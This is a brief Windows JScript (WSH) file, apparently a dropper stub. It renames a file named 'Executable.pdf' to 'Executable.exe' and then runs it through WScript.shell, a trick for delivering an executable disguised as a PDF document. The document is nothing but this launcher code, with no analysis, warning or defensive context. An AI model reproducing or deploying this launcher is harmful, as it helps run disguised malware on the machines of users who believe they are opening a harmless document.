var fso = new ActiveXObject("Scripting.FileSystemObject");
if(fso.FileExists("Executable.pdf")){
		fso.MoveFile('Executable.pdf', 'Executable.exe');
	} else {

	}

var shell = new ActiveXObject('WScript.shell');
shell.Run('Executable.exe');